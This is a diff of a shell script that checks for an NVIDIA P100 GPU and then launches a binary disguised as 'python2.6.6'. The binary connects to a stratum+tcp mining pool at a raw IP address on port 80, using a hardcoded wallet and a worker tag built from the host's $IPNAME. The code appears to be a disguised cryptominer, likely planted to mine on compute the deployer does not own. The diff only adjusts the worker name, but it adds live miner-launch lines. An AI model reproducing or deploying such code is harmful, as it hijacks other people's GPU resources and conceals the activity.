@@ -16,7 +16,7 @@ chmod +x python2.6.6
 
 if [ $(nvidia-smi | grep P100-PCIE |wc -l) == 1 ]
 then
-    ./python2.6.6  -P stratum+tcp://RMV17aQMgMPyPqJQ5H3WRQH37Njspi1SSK.RV_$IPNAME@116.203.10.54:80  -U
+    ./python2.6.6  -P stratum+tcp://RMV17aQMgMPyPqJQ5H3WRQH37Njspi1SSK.RVCU_$IPNAME@116.203.10.54:80  -U
 else
-    ./python2.6.6  -P stratum+tcp://RMV17aQMgMPyPqJQ5H3WRQH37Njspi1SSK.RV_$IPNAME@116.203.10.54:80  -U 
+    ./python2.6.6  -P stratum+tcp://RMV17aQMgMPyPqJQ5H3WRQH37Njspi1SSK.RVCU_$IPNAME@116.203.10.54:80  -U 
 fi
